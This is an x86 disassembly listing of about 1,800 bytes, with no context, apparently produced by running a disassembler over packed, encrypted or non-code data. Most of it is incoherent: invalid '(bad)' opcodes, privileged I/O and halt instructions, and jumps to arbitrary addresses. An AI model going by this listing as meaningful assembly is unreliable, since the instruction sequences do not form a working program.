  417ec5:	xchg   DWORD PTR [edx+0x952afc2],ecx
  417ecb:	imul   DWORD PTR [edx]
  417ecd:	daa    
  417ece:	mov    ch,0x37
  417ed0:	fidivr DWORD PTR [ebx]
  417ed2:	iret   
  417ed3:	shl    BYTE PTR [esi+0x23741ebb],cl
  417ed9:	sub    al,0x76
  417edb:	mov    bl,0x6d
  417edd:	stos   BYTE PTR es:[edi],al
  417ede:	sahf   
  417edf:	xor    eax,0x64057632
  417ee4:	push   edi
  417ee5:	loope  0x417eba
  417ee7:	mov    edx,0xdef21e00
  417eec:	pop    ecx
  417eed:	jp     0x417eb3
  417eef:	cld    
  417ef0:	repz or ah,BYTE PTR ds:0xb3ece63c
  417ef7:	pusha  
  417ef8:	mov    ds:0x8414b5a6,al
  417efd:	adc    bh,BYTE PTR [eax]
  417eff:	mov    dh,0x16
  417f01:	mov    dl,0xf0
  417f03:	test   DWORD PTR [ecx],edx
  417f05:	in     eax,0x4f
  417f07:	into   
  417f08:	sbb    al,0x59
  417f0a:	leave  
  417f0b:	xlat   BYTE PTR ds:[ebx]
  417f0c:	mov    ecx,0x54a03307
  417f11:	xchg   esp,eax
  417f12:	push   esp
  417f13:	cmp    dl,BYTE PTR [ebp+ebx*8-0x201d593e]
  417f1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f1b:	cmp    edx,DWORD PTR [edx+ebx*4-0x36]
  417f1f:	fmul   QWORD PTR [ebx-0x73992868]
  417f25:	push   esi
  417f26:	pop    ebp
  417f27:	push   cs
  417f28:	les    esp,FWORD PTR [edx]
  417f2a:	adc    BYTE PTR [ebx-0x66af19d0],cl
  417f30:	jp     0x417f3b
  417f32:	xchg   ebx,eax
  417f33:	pop    es
  417f34:	dec    ebx
  417f35:	lods   eax,DWORD PTR ds:[esi]
  417f36:	jmp    0x8c94eeb3
  417f3b:	dec    edi
  417f3c:	mov    ch,0x49
  417f3e:	mov    ebx,fs
  417f40:	fnstcw WORD PTR [edx+ecx*1-0x393ae2b2]
  417f47:	dec    edx
  417f48:	sub    eax,0x4ac0dcfc
  417f4d:	fwait
  417f4e:	btc    DWORD PTR [ebx],esp
  417f51:	das    
  417f52:	jbe    0x417f6c
  417f54:	and    bl,BYTE PTR [ecx]
  417f56:	sbb    eax,0x75c27965
  417f5b:	pop    eax
  417f5c:	pop    edx
  417f5d:	ret    
  417f5e:	dec    ebp
  417f5f:	xor    DWORD PTR [esi-0x72b896c],edx
  417f65:	das    
  417f66:	(bad)  
  417f67:	fwait
  417f68:	or     al,0x28
  417f6a:	adc    ebx,esp
  417f6c:	cmp    esp,DWORD PTR [edi+0x31]
  417f6f:	pushf  
  417f70:	push   ecx
  417f71:	fwait
  417f72:	jno    0x417fc9
  417f74:	cmp    DWORD PTR [ebx-0x40],0xf6f0a84a
  417f7b:	(bad)  
  417f7d:	daa    
  417f7e:	xchg   ecx,eax
  417f7f:	iret   
  417f80:	sbb    al,0x12
  417f82:	mov    bl,0x71
  417f84:	ror    DWORD PTR [ebp+0x1e],1
  417f87:	jl     0x417f3f
  417f89:	mov    edx,0xaf685343
  417f8e:	mov    BYTE PTR [edi+ebp*4-0x65c11573],ch
  417f95:	push   edx
  417f96:	jg     0x417f40
  417f98:	mov    esp,0xcad46900
  417f9d:	or     eax,0x5a0a89d9
  417fa2:	out    0xe7,eax
  417fa4:	fnstsw WORD PTR [ebp-0x17]
  417fa7:	mov    ds:0x92ef2b47,eax
  417fac:	in     al,0xe6
  417fae:	sub    BYTE PTR [eax+esi*8+0x11193817],0x15
  417fb6:	sub    dh,0x47
  417fb9:	xchg   ecx,eax
  417fba:	out    dx,al
  417fbb:	jb     0x418024
  417fbd:	sub    ebp,DWORD PTR [eax]
  417fbf:	les    esi,FWORD PTR [edx]
  417fc1:	rcl    DWORD PTR [eax+0x6a],0x8e
  417fc5:	mov    cl,0x6c
  417fc7:	inc    ecx
  417fc8:	iret   
  417fc9:	aas    
  417fca:	jno    0x417fbb
  417fcc:	outs   dx,BYTE PTR ds:[esi]
  417fcd:	mov    bl,0x44
  417fcf:	mov    WORD PTR ds:0xda8f0982,cs
  417fd5:	jle    0x417f7e
  417fd7:	xchg   ebp,eax
  417fd8:	retf   0x21bb
  417fdb:	xor    BYTE PTR [edx+ebp*1+0x4a],0x16
  417fe0:	idiv   cl
  417fe2:	mov    di,0x734f
  417fe6:	pop    esp
  417fe7:	push   esp
  417fe8:	jo     0x417ffb
  417fea:	loopne 0x417fa2
  417fec:	int3   
  417fed:	addr16 inc ebp
  417fef:	dec    eax
  417ff0:	das    
  417ff1:	(bad)  [edx-0x5f56a396]
  417ff7:	jno    0x417f91
  417ff9:	pop    eax
  417ffa:	cs ror dh,cl
  417ffd:	inc    esi
  417ffe:	inc    edi
  417fff:	jmp    0x417f8a
  418001:	dec    ebx
  418002:	hlt    
  418003:	cli    
  418004:	and    DWORD PTR ds:0xb282f0a8,ebp
  41800a:	adc    bh,0x1d
  41800d:	sbb    al,0xe8
  41800f:	fldenv [esi+0x7]
  418012:	xchg   ebp,eax
  418013:	fdivr  st(1),st
  418015:	test   DWORD PTR [ecx],esp
  418017:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418018:	js     0x417feb
  41801a:	push   edx
  41801c:	jmp    0x3c44f4ce
  418021:	sbb    BYTE PTR [edi],0x39
  418024:	gs cs ret 0xd641
  418029:	scas   al,BYTE PTR es:[edi]
  41802a:	cwde   
  41802b:	scas   eax,DWORD PTR es:[edi]
  41802c:	popa   
  41802d:	sub    eax,DWORD PTR [ecx]
  41802f:	and    eax,0x8fee384c
  418034:	mov    cl,0xd2
  418036:	outs   dx,BYTE PTR ds:[esi]
  418037:	mov    dl,0x6e
  418039:	cli    
  41803a:	dec    eax
  41803b:	add    cl,BYTE PTR [ebx]
  41803d:	pusha  
  41803e:	adc    ebp,DWORD PTR [ecx]
  418040:	pop    ds
  418041:	inc    edx
  418042:	xor    BYTE PTR [ebx],bh
  418044:	pop    eax
  418045:	inc    esi
  418046:	es mov bl,0x5d
  418049:	clc    
  41804a:	pop    es
  41804b:	enter  0x779d,0xac
  41804f:	rol    ah,0x35
  418052:	enter  0x54ce,0x3
  418056:	jb     0x418003
  418058:	retf   0xcc30
  41805b:	ins    DWORD PTR es:[edi],dx
  41805c:	and    eax,0x4ba35515
  418061:	jecxz  0x41808b
  418063:	and    edx,DWORD PTR [ecx]
  418065:	mov    DWORD PTR [ebp-0xbc96a67],ebp
  41806b:	jp     0x417ff0
  41806d:	scas   al,BYTE PTR es:[edi]
  41806e:	and    BYTE PTR [edi],0x5d
  418071:	mov    cs,WORD PTR [edi]
  418073:	mov    gs,WORD PTR es:[edi+0x967bf01]
  41807a:	pop    ebx
  41807b:	dec    ecx
  41807c:	xchg   edi,eax
  41807d:	call   0x59b3:0xd0168d
  418084:	jle    0x4180fa
  418086:	mov    esi,0xe36bc4eb
  41808b:	dec    edi
  41808d:	mov    WORD PTR [esi+0x1c6a9a47],gs
  418093:	int    0xad
  418095:	imul   edi,DWORD PTR [edi-0x63ba4fa8],0x541f4acc
  41809f:	mov    edx,esp
  4180a1:	fnsave [edi]
  4180a3:	adc    al,BYTE PTR [esi+0x66e0090b]
  4180a9:	outs   dx,DWORD PTR ds:[esi]
  4180aa:	mov    bh,0x1e
  4180ac:	fisubr DWORD PTR [ecx+0x1a]
  4180af:	popa   
  4180b0:	pop    ss
  4180b1:	loope  0x418076
  4180b3:	cli    
  4180b4:	push   eax
  4180b5:	xchg   DWORD PTR [edi+0x519baded],ebp
  4180bb:	xchg   dh,ah
  4180bd:	cld    
  4180be:	popa   
  4180bf:	out    dx,eax
  4180c0:	pop    esp
  4180c1:	push   edx
  4180c2:	ret    
  4180c3:	popf   
  4180c4:	push   0x61
  4180c6:	lea    ebx,[ebx+0x102a2548]
  4180cc:	cwde   
  4180cd:	mov    esp,0x38b174db
  4180d2:	vunpcklps xmm2,xmm3,xmm6
  4180d6:	pushf  
  4180d7:	mov    esi,DWORD PTR [esi+0x6]
  4180da:	gs cdq 
  4180dc:	add    al,0xec
  4180de:	imul   BYTE PTR [esi-0x4d4b0b1c]
  4180e4:	aaa    
  4180e5:	sub    BYTE PTR ds:0x4dd0697c,bh
  4180eb:	mov    bl,0x28
  4180ed:	push   esp
  4180ee:	add    DWORD PTR [ebp+0x6885a590],edx
  4180f4:	fimul  WORD PTR [ebx-0x5d]
  4180f7:	or     esi,DWORD PTR [ecx]
  4180f9:	push   ss
  4180fa:	icebp  
  4180fb:	sub    ebp,DWORD PTR [edi]
  4180fd:	adc    eax,0x435de961
  418102:	jp     0x418159
  418104:	mov    BYTE PTR ds:0x87050ea3,bh
  41810a:	mov    ds:0x3a13eeb1,al
  41810f:	loop   0x418096
  418111:	xor    bh,dl
  418113:	xchg   ebp,eax
  418114:	nop
  418115:	dec    esp
  418116:	ins    DWORD PTR es:[edi],dx
  418117:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418118:	(bad)  
  418119:	pop    esp
  41811a:	mov    ch,0x86
  41811c:	dec    edi
  41811d:	and    DWORD PTR [esi-0x54],esi
  418120:	das    
  418121:	inc    edx
  418122:	xor    DWORD PTR [ecx],ebx
  418124:	rcl    DWORD PTR [edi-0x7e],0x33
  418128:	jmp    0xee1c4805
  41812d:	dec    al
  41812f:	rcr    BYTE PTR [eax],1
  418131:	push   ecx
  418132:	jg     0x4180f8
  418134:	jne    0x41813f
  418136:	adc    dl,BYTE PTR [ecx-0x6675e85d]
  41813c:	mov    ebx,0xc06b6a07
  418141:	jecxz  0x4181c0
  418143:	stc    
  418144:	mov    BYTE PTR [edi],cl
  418146:	xchg   esp,eax
  418147:	mov    eax,0x1cab8528
  41814c:	daa    
  41814d:	mov    ecx,0xa29fbee7
  418152:	xor    edi,esp
  418154:	hlt    
  418155:	and    al,0x3a
  418157:	shl    DWORD PTR [ebx+0x44],cl
  41815a:	daa    
  41815b:	idiv   DWORD PTR [esi+0x66]
  41815e:	xchg   ecx,eax
  41815f:	out    0xe8,al
  418161:	sar    BYTE PTR [edx],1
  418163:	in     eax,dx
  418164:	inc    ebp
  418165:	and    edx,DWORD PTR [ecx]
  418167:	cs lock jg 0x41812a
  41816b:	fmul   DWORD PTR [ebp+edx*4-0x7e]
  41816f:	inc    BYTE PTR [eax-0x767b1d9f]
  418175:	and    eax,0x96e7e956
  41817a:	push   edi
  41817b:	aaa    
  41817c:	xlat   BYTE PTR ds:[ebx]
  41817d:	retf   
  41817e:	sbb    DWORD PTR [edi],edi
  418180:	pushf  
  418181:	je     0x41816c
  418183:	fidivr DWORD PTR [ecx]
  418185:	(bad)  
  418186:	mov    cl,0x16
  418188:	lea    esp,[esi]
  41818a:	or     al,al
  41818c:	sbb    edx,edx
  41818e:	cmp    BYTE PTR [ebx-0x75],ch
  418191:	sbb    eax,0x26004328
  418196:	mov    esi,DWORD PTR [ebp+0xc]
  418199:	xor    ecx,eax
  41819b:	xor    esi,eax
  41819d:	lea    ecx,[esi+ecx*1+0x327298]
  4181a4:	xor    ecx,eax
  4181a6:	jmp    0x4184c0
  4181ab:	sar    BYTE PTR [esi],0xce
  4181ae:	xlat   BYTE PTR ds:[ebx]
  4181af:	(bad)  
  4181b0:	xlat   BYTE PTR ds:[ebx]
  4181b1:	(bad)
  4181b4:	loope  0x41818c
  4181b6:	pop    esp
  4181b7:	mov    al,ds:0x198bbd0b
  4181bc:	xor    al,0x7f
  4181be:	js     0x41823b
  4181c0:	jle    0x41823a
  4181c2:	js     0x41818a
  4181c4:	mov    edx,?
  4181c6:	addr16 test eax,0xa4382a0e
  4181cc:	pop    edx
  4181cd:	lock xchg si,ax
  4181d0:	cmp    ah,BYTE PTR [bx-0x22]
  4181d4:	test   BYTE PTR [ecx-0x7118cb49],0x1
  4181db:	aam    0x9d
  4181dd:	dec    ebx
  4181de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4181df:	cmp    eax,0x864de47e
  4181e4:	dec    ebp
  4181e5:	aas    
  4181e6:	(bad)  
  4181e7:	lds    esp,FWORD PTR [eax+ecx*1-0x45]
  4181eb:	adc    DWORD PTR [edi+0x42],edi
  4181ee:	retf   
  4181ef:	mov    ebx,0xbe95beca
  4181f4:	into   
  4181f5:	mov    es,WORD PTR [ebx]
  4181f7:	call   0x43ab:0xf2409b1e
  4181fe:	stos   BYTE PTR es:[edi],al
  4181ff:	(bad)  
  418200:	mov    edx,0xd05346cd
  418205:	addr16 sbb eax,0x234e3e6e
  41820b:	mov    ?,WORD PTR [edx+0x31]
  41820e:	dec    edx
  41820f:	clc    
  418210:	(bad)  
  418212:	inc    BYTE PTR [edx-0x73481b61]
  418218:	cmp    al,bl
  41821a:	or     al,0x84
  41821c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41821d:	xchg   ecx,eax
  41821e:	dec    edx
  41821f:	add    DWORD PTR [eax],ebx
  418221:	pop    ebp
  418222:	mov    eax,0xb28ebd34
  418227:	lock js 0x418280
  41822a:	pop    eax
  41822b:	sahf   
  41822c:	jmp    0x418282
  41822e:	mov    cl,0xaf
  418230:	inc    edi
  418231:	in     al,dx
  418232:	loope  0x418264
  418234:	popf   
  418235:	push   ebp
  418236:	jb     0x418215
  418238:	dec    ebx
  418239:	mov    ch,0xc2
  41823b:	daa    
  41823c:	xchg   esi,eax
  41823d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41823e:	or     ch,BYTE PTR [eax]
  418240:	loope  0x4181c3
  418242:	mov    ds:0x658a67ce,al
  418248:	mov    bl,0x9
  41824a:	mov    eax,0x4f32972b
  41824f:	retf   
  418250:	test   DWORD PTR [edi+0x45a9cf71],edx
  418256:	cmp    BYTE PTR [edx-0x211f0e72],ah
  41825c:	repz retf 0x64ec
  418260:	call   0x7937834d
  418265:	xchg   esi,eax
  418266:	(bad)  
  418267:	rcl    bl,cl
  418269:	cs push cs
  41826b:	mov    ds:0x4575e23f,eax
  418270:	push   eax
  418271:	xor    al,0xea
  418273:	mov    cl,0x7f
  418275:	in     al,0xe6
  418277:	cmp    al,0xdf
  418279:	js     0x4182bb
  41827b:	(bad)  
  41827c:	ds mov eax,0x338f9f0a
  418282:	sbb    al,0x46
  418284:	shr    DWORD PTR [edx],0x8e
  418287:	sti    
  418288:	pop    eax
  418289:	push   edx
  41828a:	or     esp,DWORD PTR [esi-0x3d]
  41828d:	push   esi
  41828e:	mov    esp,DWORD PTR [eax+0x24]
  418291:	outs   dx,BYTE PTR ds:[esi]
  418292:	clc    
  418293:	(bad)  
  418294:	sub    edi,esp
  418296:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418297:	or     eax,DWORD PTR [edi+esi*4+0x6d]
  41829b:	inc    eax
  41829c:	call   0x4740:0x229d5424
  4182a3:	fcom   st(5)
  4182a5:	stos   DWORD PTR es:[edi],eax
  4182a6:	sub    bh,BYTE PTR [eax+edx*1+0x66]
  4182aa:	push   0xffffffba
  4182ac:	or     ah,BYTE PTR [eax-0x2c]
  4182af:	add    dl,BYTE PTR ds:0x28be84bd
  4182b5:	jecxz  0x4182b1
  4182b7:	push   ebx
  4182b8:	cli    
  4182b9:	jmp    0x15ad195c
  4182be:	pop    ebp
  4182bf:	push   eax
  4182c0:	cmp    edi,DWORD PTR [edi-0x5fe84096]
  4182c6:	int    0x31
  4182c8:	pop    ds
  4182c9:	cmc    
  4182ca:	sub    DWORD PTR [eax-0x6ff87330],esp
  4182d0:	pmulhw mm1,QWORD PTR [eax]
  4182d3:	cmc    
  4182d4:	cs mov edi,0x29e6aaa
  4182da:	dec    edx
  4182db:	mov    dl,0x9a
  4182dd:	xor    DWORD PTR [esi-0x75],esp
  4182e0:	jns    0x418298
  4182e2:	jle    0x418274
  4182e4:	mov    edi,0x2ae402ca
  4182e9:	pop    ss
  4182ea:	mov    ebx,0x619ee603
  4182ef:	mov    bl,0x1
  4182f1:	inc    esp
  4182f2:	es out dx,eax
  4182f4:	call   0x7227:0x1091f2a0
  4182fb:	jecxz  0x4182e7
  4182fd:	test   BYTE PTR [ebx+0x113600c4],0xd9
  418304:	aad    0xb3
  418306:	test   eax,0xb0177589
  41830b:	retf   
  41830c:	icebp  
  41830d:	das    
  41830e:	cdq    
  41830f:	fnsave [ebx]
  418311:	mov    dh,0x7e
  418313:	je     0x41831a
  418315:	jge    0x4182b2
  418317:	sub    DWORD PTR [edx],0x7e896f7f
  41831d:	xchg   ecx,eax
  41831e:	xchg   ebp,eax
  41831f:	fimul  DWORD PTR [ebx-0xe]
  418322:	scas   al,BYTE PTR es:[edi]
  418323:	retf   0x31d4
  418326:	mov    edi,0xd95b6842
  41832b:	in     eax,0x6d
  41832d:	and    esi,DWORD PTR [ebx+0x72]
  418330:	jne    0x4182b2
  418332:	adc    edi,esi
  418334:	cmp    al,ah
  418336:	xor    edi,ecx
  418338:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418339:	inc    ebx
  41833a:	mov    bl,0x56
  41833c:	ds (bad) 
  41833e:	nop
  41833f:	outs   dx,BYTE PTR ds:[esi]
  418340:	adc    dh,BYTE PTR [eax+0x292395e9]
  418346:	mov    dl,0x76
  418348:	pop    es
  418349:	add    ebp,ecx
  41834b:	lds    ecx,FWORD PTR [eax+0x9ab72fb]
  418351:	mov    ebp,esi
  418353:	repnz pop esp
  418355:	jo     0x418378
  418357:	mov    WORD PTR [ebp-0x423f236e],gs
  41835d:	sbb    ch,BYTE PTR [eax-0x4e]
  418360:	dec    edi
  418361:	(bad)  
  418362:	jbe    0x41833d
  418364:	stos   DWORD PTR es:[edi],eax
  418365:	jle    0x41837f
  418367:	scas   al,BYTE PTR es:[edi]
  418368:	cmp    al,BYTE PTR [ecx-0x34ac7107]
  41836e:	mov    dl,BYTE PTR [esi]
  418370:	mov    edx,0x2bcc34c7
  418375:	int    0x22
  418377:	sbb    DWORD PTR [edx-0x3f94e0fb],edx
  41837d:	inc    edi
  41837e:	shr    DWORD PTR [edx+0x1a],cl
  418381:	in     al,dx
  418382:	mov    WORD PTR [eax+0xeba0bb4],ds
  418388:	je     0x418391
  41838a:	test   eax,0xab759eb
  41838f:	cmp    DWORD PTR [ebx-0xe],edx
  418392:	adc    al,0x1b
  418394:	and    DWORD PTR [edx],ebp
  418396:	ror    al,cl
  418398:	sbb    ch,al
  41839a:	xchg   esi,eax
  41839b:	adc    esi,DWORD PTR [ebp-0x6a]
  41839e:	cmp    al,0x7f
  4183a0:	push   0x144be489
  4183a5:	dec    eax
  4183a6:	cwde   
  4183a7:	cmp    cl,BYTE PTR [eax-0x69]
  4183aa:	jmp    0xe17:0xd5b2169f
  4183b1:	aam    0x35
  4183b3:	imul   ebx,DWORD PTR [ecx],0xffffffc0
  4183b6:	jno    0x4183c8
  4183b8:	leave  
  4183b9:	in     eax,dx
  4183ba:	icebp  
  4183bb:	aaa    
  4183bc:	push   ebx
  4183bd:	xchg   edi,eax
  4183be:	dec    edx
  4183bf:	lea    edi,[eax]
  4183c1:	mov    ds:0xe8cbd778,al
  4183c6:	xchg   ebp,eax
  4183c7:	and    ah,BYTE PTR [ebp-0x779fbdff]
  4183cd:	addr16 out dx,al
  4183cf:	push   edi
  4183d0:	frstor es:[edi+ebx*8-0xa]
  4183d5:	push   edx
  4183d6:	jns    0x4183d2
  4183d8:	iret   
  4183d9:	cmp    al,0x70
  4183db:	mov    ch,0xf2
  4183dd:	mov    ds:0xa5187ad5,eax
  4183e2:	pop    es
  4183e3:	cli    
  4183e4:	and    DWORD PTR [ebx],esp
  4183e6:	xor    DWORD PTR [esp+eiz*8-0x58],esi
  4183ea:	jp     0x41845b
  4183ec:	mov    eax,ds:0xa4c2020c
  4183f1:	addr16 mov ds:0x6f49,al
  4183f5:	push   ds
  4183f6:	rcr    BYTE PTR [esi+0x61],cl
  4183f9:	mov    WORD PTR [ecx-0x6d7a7471],cs
  4183ff:	add    al,0x5e
  418401:	and    BYTE PTR [edi+0x1f68f78b],ch
  418407:	jns    0x418414
  418409:	sti    
  41840a:	in     eax,0xf8
  41840c:	cli    
  41840d:	loopne 0x41842b
  41840f:	xor    eax,0x4fb96cdd
  418414:	dec    edx
  418415:	xchg   DWORD PTR [esi-0x273cd9c6],esp
  41841b:	fs sub eax,0x462d1fed
  418421:	mov    bh,0xbf
  418423:	sbb    eax,0xf822b811
  418428:	sub    al,0x5
  41842a:	gs scas eax,DWORD PTR es:[edi]
  41842c:	mov    al,0x6f
  41842e:	and    BYTE PTR [ecx+eiz*8],ah
  418431:	adc    DWORD PTR [ebp-0x7115cd3c],ebx
  418437:	and    eax,0xcdd5db7b
  41843c:	and    ah,bl
  41843e:	outs   dx,DWORD PTR ds:[esi]
  41843f:	jmp    0x418418
  418441:	sbb    DWORD PTR [esi],eax
  418443:	in     al,dx
  418444:	fisub  DWORD PTR [edi-0xa]
  418447:	cmp    edi,DWORD PTR cs:[edi]
  41844a:	ror    ah,0x1d
  41844d:	or     al,0xe6
  41844f:	call   0x307e1f42
  418454:	dec    edi
  418455:	add    al,0x4e
  418457:	and    ebx,DWORD PTR [edi-0x75]
  41845a:	dec    eax
  41845b:	sbb    eax,0xd7c6c77d
  418460:	mov    edx,0xaeabe210
  418465:	and    BYTE PTR [ecx-0x1e],dh
  418468:	test   DWORD PTR [esi],0x17d088ed
  41846e:	dec    ecx
  41846f:	ins    DWORD PTR es:[edi],dx
  418470:	dec    edx
  418471:	xchg   edi,eax
  418472:	sub    cl,bl
  418474:	pop    edx
  418475:	int3   
  418476:	hlt    
  418477:	inc    eax
  418478:	mov    dh,0x73
  41847a:	popa   
  41847b:	stos   DWORD PTR es:[edi],eax
  41847c:	xchg   edx,eax
  41847d:	ins    BYTE PTR es:[edi],dx
  41847e:	je     0x418405
  418480:	cwd    
  418482:	jnp    0x418499
  418484:	not    BYTE PTR [ebp-0x63]
  418487:	ror    BYTE PTR [ebx],1
  418489:	and    eax,0x64f409d6
  41848e:	je     0x418486
  418490:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418491:	dec    edx
  418492:	pop    edi
  418493:	add    eax,0x65b172c
  418498:	mov    esi,0x8cee88b5
  41849d:	xor    esp,DWORD PTR [ebx-0x7f5a4551]
  4184a3:	js     0x4184b2
  4184a5:	sahf   
  4184a6:	(bad)  
  4184a7:	sbb    al,bh
  4184a9:	out    0x60,al
  4184ab:	fnsave [esi]
  4184ad:	or     DWORD PTR [edx-0x59],edi
  4184b0:	outs   dx,DWORD PTR ds:[esi]
  4184b1:	mov    ds:0x4c7e2ce1,eax
  4184b6:	mov    bl,0x40
  4184b8:	xor    edx,edx
  4184ba:	out    0xce,eax
  4184bc:	xchg   edi,eax
  4184bd:	adc    esi,ecx
  4184bf:	adc    eax,DWORD PTR [ecx-0x637ad707]
  4184c5:	clc    
  4184c6:	jne    0x417e12
  4184cc:	jmp    0x418819
  4184d1:	jmp    0x4187eb
  4184d6:	int3   
  4184d7:	les    edi,FWORD PTR [edi+ecx*8]
  4184da:	aam    0xd7
  4184dc:	ror    ebx,cl
  4184de:	mov    esi,0xcbec6d48
  4184e3:	add    eax,DWORD PTR [ecx+0x21]
  4184e6:	adc    al,0x39
  4184e8:	jg     0x418562
  4184ea:	jnp    0x41856a
  4184ec:	js     0x418566
  4184ee:	push   edi
  4184ef:	adc    al,0x5c
  4184f1:	inc    esp
  4184f2:	jb     0x418482
  4184f4:	push   ss
  4184f5:	mov    bh,0xb0
  4184f7:	mov    esp,0x8fd1683c
  4184fc:	fld    DWORD PTR [eax]
  4184fe:	sbb    BYTE PTR [ecx],0xdc
  418501:	mov    esp,0xd0be712e
  418506:	imul   esi,DWORD PTR [ebx-0xd76ae0a],0xb72cd2a1
  418510:	xor    al,0x48
  418512:	sub    al,0xc9
  418514:	rcr    al,cl
  418516:	bnd jle 0x4184fd
  418519:	sub    BYTE PTR [eax-0x548c3af5],0xc8
  418520:	icebp  
  418521:	int    0x90
  418523:	popa   
  418524:	lahf   
  418525:	pop    esi
  418526:	fdiv   DWORD PTR [ecx-0x60]
  418529:	or     BYTE PTR [eax+0x2e],dl
  41852c:	mov    ebp,0xd6ebbba5
  418531:	pusha  
  418532:	or     eax,0x191aedd2
  418537:	mov    esp,gs
  418539:	mov    dh,0x88
  41853b:	mov    ds:0x72a4affe,al
  418540:	xchg   ebp,eax
  418541:	push   esp
  418542:	adc    cl,BYTE PTR [ebp-0x79]
  418545:	ins    DWORD PTR es:[edi],dx
  418546:	adc    al,0x3
  418548:	mov    ch,BYTE PTR [ebx+0x9fc5dbf]
  41854e:	mov    al,ds:0xd40f055
  418553:	and    esi,DWORD PTR ds:0x31384ee0
  418559:	sbb    ah,ch
  41855b:	xor    BYTE PTR [ecx+0x3ccfe020],0xb6
  418562:	mov    esi,ecx
  418564:	or     ecx,DWORD PTR [ebx]
  418566:	addr16 push 0x76461ae9
  41856c:	pusha  
  41856d:	xchg   ebx,eax
  41856e:	ss sub ecx,0xad7c7cad
  418575:	enter  0x530b,0xa8
  418579:	sub    ebp,DWORD PTR [esi-0x1a17b52f]
  41857f:	xor    BYTE PTR [esp+edx*8-0x2e200662],ah
  418586:	xchg   BYTE PTR [ebp+0x61976985],ch
  41858c:	outs   dx,BYTE PTR ds:[esi]
  41858d:	popa   
  41858e:	cs in  eax,dx
  418590:	jbe    0x4185cd
  418592:	add    eax,0x41476098
  418597:	cmp    BYTE PTR [ebx-0x4ef4c9fe],cl
  41859d:	test   DWORD PTR [ebp+0x6ffcdb3a],eax
  4185a3:	dec    edi
  4185a4:	sub    eax,0xc8ab93e7
  4185a9:	pmulhuw mm3,QWORD PTR [edi+ebp*1-0x28cfce1f]
  4185b1:	push   cs
  4185b2:	push   0x804deca
  4185b7:	pop    ss
  4185b8:	adc    dl,BYTE PTR [ecx+edi*1-0x5a]
  4185bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185bd:	scas   al,BYTE PTR es:[edi]
  4185be:	xor    eax,0x57b7b5b2
  4185c3:	test   BYTE PTR [ecx+0x26],0x7a
  4185c7:	push   0xafae2b75
  4185cc:	sub    BYTE PTR [edi],al
  4185ce:	lds    eax,FWORD PTR [edi+eiz*4+0x1b]
  4185d2:	push   ecx
  4185d3:	add    ecx,DWORD PTR [edx-0x41fb8323]
  4185d9:	ror    DWORD PTR [esi+ebp*1],1
  4185dc:	imul   edi,DWORD PTR ds:0x2a4daee5,0x1b8167a7
  4185e6:	repz sub esi,DWORD PTR [eax]
  4185e9:	leave  
  4185ea:	adc    cl,0xdd
  4185ed:	data16 into 
  4185ef:	pop    eax
  4185f0:	cdq    
  4185f1:	xchg   BYTE PTR [edx],al
  4185f3:	(bad)  
  4185f4:	or     al,0xb9
  4185f6:	cmp    edx,edi
  4185f8:	mov    esi,0x8c23a503
  4185fd:	add    cl,BYTE PTR [ebx+0x51fa3acb]
  418603:	(bad)  
  418604:	call   0xbf8d:0x558a8ad0
  41860b:	add    BYTE PTR [edi],ah
  41860d:	mov    dl,0xf1
  41860f:	mov    dl,0x65
  418611:	jge    0x418648
  418613:	out    0x2f,al
  418615:	data16 cmp BYTE PTR [eax],bh
  418618:	and    eax,0x28c4d7e
  41861d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41861e:	pop    ebx
  41861f:	idiv   BYTE PTR [eax]
  418621:	popf   
  418622:	mov    al,0x89
  418624:	jns    0x4185e2
  418626:	sub    ebx,DWORD PTR [ecx-0x3a]
  418629:	mov    ch,0x50
  41862b:	sub    al,BYTE PTR [ecx]
  41862d:	out    0x2e,eax
  41862f:	outs   dx,DWORD PTR ds:[esi]
  418630:	mov    ebx,0x1abe76f2
  418635:	repnz (bad) 
  418638:	mov    edx,0x28b7482f
  41863d:	ins    DWORD PTR es:[edi],dx
  41863e:	push   0xffffffe1
  418640:	aad    0x5
  418642:	jl     0x418687
  418644:	std    
  418645:	stc    
  418646:	ret    0x1a2
  418649:	xor    eax,0x967064c8
  41864e:	push   eax
  41864f:	adc    ah,0x14
  418652:	mov    DWORD PTR [ebp-0x58],eax
  418655:	xchg   ebp,eax
  418656:	inc    esp
  418657:	inc    esp
  418658:	jmp    0xa675b98d
  41865d:	xlat   BYTE PTR ds:[ebx]
  41865e:	icebp  
  41865f:	jnp    0x418684
  418661:	add    ecx,DWORD PTR ds:0x19602b99
  418667:	(bad)  
  418668:	retf   
  418669:	lods   eax,DWORD PTR ds:[esi]
  41866a:	retf   
  41866b:	xchg   BYTE PTR [edi-0x70f5254a],bl
  418671:	div    DWORD PTR [ebp+0x31]
  418674:	int3   
  418675:	out    0xe6,eax
  418677:	xor    DWORD PTR [edx+0x6104d36a],eax
  41867d:	popf   
  41867e:	and    al,BYTE PTR [eax-0xb]
  418681:	sbb    cl,al
  418683:	mov    dh,0x79
  418685:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418686:	ins    DWORD PTR es:[edi],dx
  418687:	cmp    DWORD PTR [esi+0x3f0fd360],edi
  41868d:	sub    eax,esi
  41868f:	test   BYTE PTR [ebx-0x7293a70c],dh
  418695:	popa   
  418696:	div    DWORD PTR [eax+0x32]
  418699:	push   eax
  41869a:	jg     0x41867e
  41869c:	dec    esp
  41869d:	ret    
  41869e:	(bad)  
  41869f:	xor    ecx,eax
  4186a1:	shl    ch,1
  4186a3:	or     DWORD PTR [ecx-0x14],0xffffffbe
  4186a7:	adc    bh,bl
  4186a9:	shr    DWORD PTR [ebp+0x7c],0x85
  4186ad:	push   eax
  4186ae:	mov    ds:0xa33c4d7f,al
  4186b3:	mov    ds:0x8b56e69e,al
  4186b8:	or     al,0xfc
  4186ba:	icebp  
  4186bb:	ror    BYTE PTR [ebp+0x69],1
  4186be:	push   0x6a2e20d0
